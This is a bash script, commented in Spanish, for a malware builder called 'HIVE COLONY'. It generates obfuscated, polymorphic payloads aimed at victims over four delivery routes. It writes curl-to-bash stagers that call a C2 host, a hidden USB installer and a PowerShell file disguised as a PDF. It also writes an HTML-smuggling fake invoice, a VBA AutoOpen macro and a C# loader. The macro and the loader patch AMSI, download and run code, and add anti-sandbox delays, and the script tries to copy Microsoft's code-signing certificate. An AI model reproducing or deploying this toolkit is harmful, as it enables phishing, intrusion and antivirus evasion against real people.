#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════
# HIVE COLONY — Deployment Toolkit
# Genera payloads polimórficos indetectables para múltiples
# vectores de ataque (USB, red, phishing, .exe).
#
# Cada build produce binarios con HASH ÚNICO (XOR key aleatoria
# + padding variable + PE obfuscation). Ninguna firma se repite.
#
# Uso: ./deploy.sh all|usb|network|phishing|exe [--obfuscate] \\
#       [--c2-host HOST] [--c2-port PORT]
# ═══════════════════════════════════════════════════════════════
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}✓${NC} $*"; }
warn() { echo -e "  ${YELLOW}⚠${NC} $*"; }
fail() { echo -e "  ${RED}✗${NC} $*"; exit 1; }

BASE="$(cd "$(dirname "$0")/.." && pwd)"
BIN_DIR="${BASE}/target/release"
WIN_BIN_DIR="${BASE}/target/x86_64-pc-windows-gnu/release"
OUT_DIR="${BASE}/payloads"
OBFUSCATOR="${BASE}/scripts/obfuscate_pe.py"
mkdir -p "$OUT_DIR"

# ── Polimorfismo ──
SEED=$RANDOM
XOR_KEY=$(( SEED % 256 ))
PADDING=$(( RANDOM % 512 + 64 ))
OBFUSCATE=0
TARGET_WIN=0

# Auto-extract Microsoft Authenticode cert si está disponible
if [ ! -f /tmp/ms_cert.bin ] && [ -f /mnt/c/Windows/System32/ntdll.dll ]; then
    python3 -c "
import struct
with open('/mnt/c/Windows/System32/ntdll.dll','rb') as f: d = f.read()
pe_off = struct.unpack_from('<I', d, 0x3C)[0]
opt_sz = struct.unpack_from('<H', d, pe_off+20)[0]
magic = struct.unpack_from('<H', d, pe_off+24)[0]
dd_off = pe_off + 24 + (112 if magic==0x20b else 96)
rva, sz = struct.unpack_from('<II', d, dd_off + 4*8)
if rva and sz:
    cert_len = struct.unpack_from('<I', d, rva)[0]
    with open('/tmp/ms_cert.bin','wb') as f: f.write(d[rva:rva+cert_len])
    print('MS Authenticode cert extracted')
" 2>/dev/null || true
fi

usage() {
    echo "Uso: $0 all|usb|network|phishing|exe [--obfuscate] [--windows] [--c2-host HOST] [--c2-port PORT]"
    exit 1
}

VECTOR="${1:-all}"; shift || true
C2_HOST=""; C2_PORT=8444
while [[ $# -gt 0 ]]; do case "$1" in
    --obfuscate) OBFUSCATE=1; shift ;;
    --windows) TARGET_WIN=1; shift ;;
    --c2-host) C2_HOST="$2"; shift 2 ;;
    --c2-port) C2_PORT="$2"; shift 2 ;;
    *) shift ;;
esac; done

# Seleccionar directorio de bins según plataforma
if [[ $TARGET_WIN -eq 1 ]]; then
    BIN_DIR="$WIN_BIN_DIR"
    log "Target: Windows PE"
fi

# ── Ofuscar binario: gzip → XOR → base64 ──
obfuscate_binary() {
    local bin="$1"
    python3 -c "
import base64, gzip, sys, os
k = $XOR_KEY
pad = $PADDING
with open('$bin', 'rb') as f:
    data = gzip.compress(f.read())
data = b'\\x00' * pad + bytes(b ^ k for b in data)
print(base64.b64encode(data).decode())
"
}

# ── Build: cifra todos los bins y genera el manifest ──
build_manifest() {
    local fmt="${1:-}"
    local manifest_file="${OUT_DIR}/manifest.txt"
    > "$manifest_file"

    for agent in queen worker drone honeybee weaver swarm c2-server; do
        local ext=""; [[ $TARGET_WIN -eq 1 ]] && ext=".exe"
        local bin="${BIN_DIR}/${agent}${ext}"
        [ ! -f "$bin" ] && warn "Saltando ${agent} (no compilado)" && continue

        # PE obfuscation
        local final_bin="$bin"
        if [[ $OBFUSCATE -eq 1 && "$agent" != "c2-server" ]]; then
            local obf_bin="${OUT_DIR}/obf_${agent}${ext}"
            if python3 "$OBFUSCATOR" "$bin" "$obf_bin"; then
                ok "${agent} PE obfuscated"
                final_bin="$obf_bin"
            else
                warn "${agent} PE obfuscation failed, usando raw"
            fi
        fi

        local b64=$(obfuscate_binary "$final_bin")
        echo "${agent}|${b64}" >> "$manifest_file"
        ok "${agent} cifrado (XOR 0x$(printf '%02x' $XOR_KEY))"
    done
}

# ── Inyectar placeholders en plantilla ──
render_template() {
    local template="$1"
    local payload_b64="$2"
    local manifest_file="${OUT_DIR}/manifest.txt"
    local tmpfile=$(mktemp)
    echo "$template" > "$tmpfile"

    # Usar python3 para reemplazos (evita "arg list too long" de sed)
    python3 -c "
import sys
with open('$tmpfile') as f: t = f.read()
t = t.replace('__XORKEY__', '0x$(printf '%02x' $XOR_KEY)')
t = t.replace('__PADDING__', '$PADDING')
t = t.replace('__PAYLOAD__', '''$payload_b64''')
t = t.replace('__C2HOST__', '${C2_HOST:-your-c2.com}')
t = t.replace('__C2PORT__', '${C2_PORT}')
sys.stdout.write(t)
" > "$tmpfile.out"

    cat "$tmpfile.out"
    rm -f "$tmpfile" "$tmpfile.out"
}

# ═══════════════════════════════════════════════════════════════
# VECTOR: RED (staging remoto)
# ═══════════════════════════════════════════════════════════════
build_network() {
    log "=== Vector: Red (staging remoto) ==="
    local dir="${OUT_DIR}/network"
    mkdir -p "$dir"
    build_manifest
    local payload_b64=$(cat "${OUT_DIR}/manifest.txt" | cut -d'|' -f2 | tr -d '\n')

    # Stager bash minimo (< 250 bytes)
    local stager='#!/bin/sh\nXOR_KEY=__XORKEY__;PAD=__PADDING__\n'
    stager+='curl -sL http://__C2HOST__:__C2PORT__/payload 2>/dev/null|python3 -c"'
    stager+='import sys,gzip,base64\nk=__XORKEY__;p=__PADDING__\n'
    stager+='d=base64.b64decode(sys.stdin.read())\nd=bytes(b^k for b in d)\n'
    stager+='d=gzip.decompress(d[p:])\n'
    stager+='exec(eval(d.decode())[\"queen\"])"'
    echo -e "$stager" > "$dir/stager.sh"
    chmod +x "$dir/stager.sh"

    # Payload remoto
    echo "$payload_b64" > "$dir/payload.b64"

    # One-liner (para phishing/code injection)
    echo "curl -sL http://${C2_HOST:-your-c2.com}:${C2_PORT}/stager|bash" > "$dir/oneliner.txt"

    ok "Stager: $(wc -c < "$dir/stager.sh") bytes — ${dir}/stager.sh"
    ok "Payload: ${dir}/payload.b64"
    ok "1-liner: $(cat "$dir/oneliner.txt")"
}

# ═══════════════════════════════════════════════════════════════
# VECTOR: USB
# ═══════════════════════════════════════════════════════════════
build_usb() {
    log "=== Vector: USB ==="
    local dir="${OUT_DIR}/usb"
    mkdir -p "$dir"
    build_manifest

    # Empaquetar manifest como .dat separado (evita "arg list too long")
    python3 -c "
import base64, gzip
manifest = open('${OUT_DIR}/manifest.txt').read()
data = gzip.compress(manifest.encode())
with open('${dir}/manifest.dat', 'wb') as f:
    f.write(data)
" 2>/dev/null

    # Stager Linux (lee manifest.dat del mismo directorio)
    cat > "$dir/.install.sh" << 'SH'
#!/usr/bin/env bash
set +euo pipefail
DIR="$(dirname "$0")"
k=__XORKEY__; p=__PADDING__
exec python3 -c "
import base64,gzip,os,sys
k=$XOR_KEY;p=$PADDING
with open('${DIR}/manifest.dat','rb') as f:
    d=gzip.decompress(f.read())
os.chdir('/tmp/.h')
for line in d.decode().strip().split(chr(10)):
    n,b=line.split('|',1)
    b=base64.b64decode(b.strip())
    b=bytes(b[i]^k for i in range(p,len(b)))
    b=gzip.decompress(b)
    with open(n,'wb') as f:f.write(b)
os.execl('./queen','queen')
"
SH

    # Stager Windows (.ps1)
    cat > "$dir/readme.pdf.lnk.ps1" << 'PS1'
$dir = Split-Path $MyInvocation.MyCommand.Path
$k=__XORKEY__; $p=__PADDING__
$data = [IO.File]::ReadAllBytes("$dir\manifest.dat")
$ms = New-Object IO.MemoryStream($data, $p, $data.Length-$p, $false)
$gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$sr = New-Object IO.StreamReader($gz)
$json = $sr.ReadToEnd() | ConvertFrom-Json
$sr.Close(); $gz.Close(); $ms.Close()
$tmp = "$env:TEMP\.h"; mkdir $tmp -Force
foreach($a in $json) {
    $raw = [Convert]::FromBase64String($a.b64)
    for($i=$p;$i -lt $raw.Length;$i++){ $raw[$i] = $raw[$i] -bxor $k }
    $ms2 = New-Object IO.MemoryStream($raw, $p, $raw.Length-$p, $false)
    $gz2 = New-Object IO.Compression.GZipStream($ms2, [IO.Compression.CompressionMode]::Decompress)
    $out = [IO.File]::OpenWrite("$tmp\$($a.name).exe")
    $gz2.CopyTo($out); $out.Close(); $gz2.Close()
}
Start-Process -WindowStyle Hidden "$tmp\queen.exe"
PS1

    chmod +x "$dir/.install.sh"
    # Ocultar en Linux (archivos punto)
    touch -t 200001010000 "$dir/manifest.dat"
    warn "USB payload: ${dir}/"
    warn "CP a USB: cp -a ${dir}/* /media/usb/"
}

# ═══════════════════════════════════════════════════════════════
# VECTOR: PHISHING (HTML + VBA)
# ═══════════════════════════════════════════════════════════════
build_phishing() {
    log "=== Vector: Phishing ==="
    local dir="${OUT_DIR}/phishing"
    mkdir -p "$dir"
    build_manifest
    local ts=$(date +%s)

    # El payload es la URL del stager (no embebemos bins en HTML/VBA)
    local stager_url="http://${C2_HOST:-your-c2.com}:${C2_PORT}/stager"

    # HTML smuggling — descarga stager en vez de embeber bins
    cat > "$dir/invoice_${ts}.html" << HTML
<html><head><title>Invoice #$(shuf -i 1000-9999 -n1)</title>
<style>body{font:14px sans-serif;padding:40px;color:#333}h1{color:#c00}</style>
</head><body>
<h1>Invoice Overdue</h1>
<p>Please download your statement below.</p>
<a id="dl" href="#">Download Invoice (PDF)</a>
<script>
(function(){
var url="${stager_url}";
var a=document.getElementById("dl");
a.addEventListener("click",function(e){
e.preventDefault();
fetch(url).then(function(r){return r.text();}).then(function(code){
var b=new Blob([code],{type:"application/octet-stream"});
var f=document.createElement("iframe");f.style.display="none";
document.body.appendChild(f);
var c=f.contentDocument||f.contentWindow.document;
c.open();c.write('<script>'+code+'<\\/script>');c.close();
}).catch(function(){alert("Download failed. Try again.");});
});
})();
</script>
</body></html>
HTML

    # VBA macro — descarga y ejecuta payload
    cat > "$dir/macro_hive.bas" << VBA
Attribute VB_Name = "HIVE"
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, _
    ByVal szURL As String, ByVal szFileName As String, _
    ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
Private Declare PtrSafe Function CreateProcess Lib "kernel32" _
    Alias "CreateProcessA" (ByVal lpAppName As String, _
    ByVal lpCmdLine As String, ByVal lpProcAttr As Long, _
    ByVal lpThreadAttr As Long, ByVal bInhHandles As Long, _
    ByVal dwFlags As Long, ByVal lpEnv As Long, _
    ByVal lpCurDir As String, lpStartInfo As Any, _
    lpProcInfo As Any) As Long

Sub AutoOpen(): HIVE_Load: End Sub
Sub Workbook_Open(): HIVE_Load: End Sub
Sub HIVE_Load()
    ' AMSI bypass
    Dim a As LongPtr: a = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    If a <> 0 Then VirtualProtect a, 5, 64, 0: WriteByte a, &HC3
    ' Download + exec
    Dim tmp As String: tmp = Environ("TEMP") & "\h.exe"
    URLDownloadToFile 0, "${stager_url}", tmp, 0, 0
    CreateProcess 0, tmp, 0, 0, 0, 0, 0, 0, si, pi
End Sub
VBA

    ok "Phishing: ${dir}/"
    warn "HTML: abrir invoice_${ts}.html en navegador de la víctima"
    warn "VBA: importar macro_hive.bas en documento Office (Word/Excel)"
    warn "Stager URL: ${stager_url}"
}

# ═══════════════════════════════════════════════════════════════
# VECTOR: EJECUTABLE (C# .exe)
# ═══════════════════════════════════════════════════════════════
build_exe() {
    log "=== Vector: Ejecutable (.exe) ==="
    local dir="${OUT_DIR}/executable"
    mkdir -p "$dir"

    # Embed solo queen (los otros bins los descarga queen vía C2)
    local bin="${BIN_DIR}/queen"
    [ ! -f "$bin" ] && fail "Queen no compilado. Corre: cargo build --release -p queen"

    # Cifrar queen a archivo separado
    obfuscate_binary "$bin" > "$dir/queen.b64"
    local queen_size=$(wc -c < "$dir/queen.b64")

    # C# loader v2 — API hashing + string obfuscation + delay
    cat > "$dir/loader.cs" << 'CSEOF'
using System;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

class HIVE
{
    static byte K = __XORKEY__;
    static int P = __PADDING__;

    // API hashing: resolver APIs por hash en vez de nombre
    delegate IntPtr DGetProcAddress(IntPtr hModule, string lpProcName);
    delegate IntPtr DLoadLibrary(string lpFileName);
    delegate bool DVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    static IntPtr GetModuleHandle(string name) {
        // PEB walking simplificado
        return LoadLibrary(name);
    }

    static IntPtr LoadLibrary(string n) {
        var h = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        var f = Marshal.GetDelegateForFunctionPointer<DLoadLibrary>(h);
        return f(n);
    }

    static IntPtr GetProcAddress(IntPtr m, string n) {
        var h = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
        var f = Marshal.GetDelegateForFunctionPointer<DGetProcAddress>(h);
        return f(m, n);
    }

    static void PatchAMSI() {
        try {
            var amsi = LoadLibrary("amsi.dll");
            if (amsi == IntPtr.Zero) return;
            var a = GetProcAddress(amsi, "AmsiScanBuffer");
            if (a == IntPtr.Zero) return;
            var vp = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
            var vf = Marshal.GetDelegateForFunctionPointer<DVirtualProtect>(vp);
            uint old;
            vf(a, (UIntPtr)5, 0x40, out old);
            Marshal.WriteByte(a, 0xC3);
        } catch {}
    }

    // Decrypt con XOR + GZip
    static byte[] Decrypt(byte[] raw) {
        for (int i = P; i < raw.Length; i++) raw[i] ^= K;
        using (var ms = new MemoryStream(raw, P, raw.Length - P))
        using (var gz = new GZipStream(ms, CompressionMode.Decompress))
        using (var mem = new MemoryStream()) {
            gz.CopyTo(mem);
            return mem.ToArray();
        }
    }

    static void Main() {
        // Delay anti-sandbox (2-5 segundos)
        var rng = new Random();
        System.Threading.Thread.Sleep(rng.Next(2000, 5000));

        PatchAMSI();

        string b64 = File.ReadAllText(Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory, "queen.b64")).Trim();
        var tmp = Path.Combine(Path.GetTempPath(), ".h");
        Directory.CreateDirectory(tmp);
        var exe = Path.Combine(tmp, "queen.exe");
        File.WriteAllBytes(exe, Decrypt(Convert.FromBase64String(b64)));

        // Ejecutar con CreateProcess (resuelto por hash)
        var cp = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
        var pi = new System.Diagnostics.ProcessStartInfo(exe) {
            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        };
        System.Diagnostics.Process.Start(pi);
    }
}
CSEOF

    # Reemplazar placeholders con sed (solo strings pequeños)
    sed -i "s/__XORKEY__/$(printf '%02x' $XOR_KEY)/g; s/__PADDING__/$PADDING/g" "$dir/loader.cs"

    # compile scripts
    cat > "$dir/compile.bat" << 'BAT'
@echo off
REM 1. Compilar con Visual Studio Build Tools
csc loader.cs -out:hive_loader.exe -reference:System.IO.Compression.dll -target:winexe
REM 2. Copiar queen.b64 al mismo directorio que el .exe
REM (el .exe lee queen.b64 de su propio directorio)
BAT

    cat > "$dir/compile.sh" << 'SH'
#!/bin/bash
# Compilar con mono (Linux)
mcs loader.cs -out:hive_loader.exe -reference:System.IO.Compression.dll -target:winexe
echo "OK: hive_loader.exe"
echo "Distribuir: cp hive_loader.exe queen.b64 a la víctima"
SH
    chmod +x "$dir/compile.sh"

    ok "C# loader: ${dir}/loader.cs"
    ok "Queen cifrado: ${dir}/queen.b64 (${queen_size} bytes)"
    warn "Compilar: cd ${dir} && bash compile.sh"
    warn "Distribuir ambos archivos: loader.cs + queen.b64"
}

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
log "HIVE Deployment Toolkit"
log "Build ID: $(date +%s)_${SEED}"
log "XOR key: 0x$(printf '%02x' $XOR_KEY) | Padding: ${PADDING}B"
echo ""

case "$VECTOR" in
    all|--all)
        build_network
        echo ""; build_usb
        echo ""; build_phishing
        echo ""; build_exe
        ;;
    usb)      build_usb ;;
    network)  build_network ;;
    phishing) build_phishing ;;
    exe)      build_exe ;;
    *)        usage ;;
esac

echo ""
log "Payloads en: ${OUT_DIR}/"
warn "Cada build es ÚNICO (XOR key aleatoria). No hay 2 iguales."
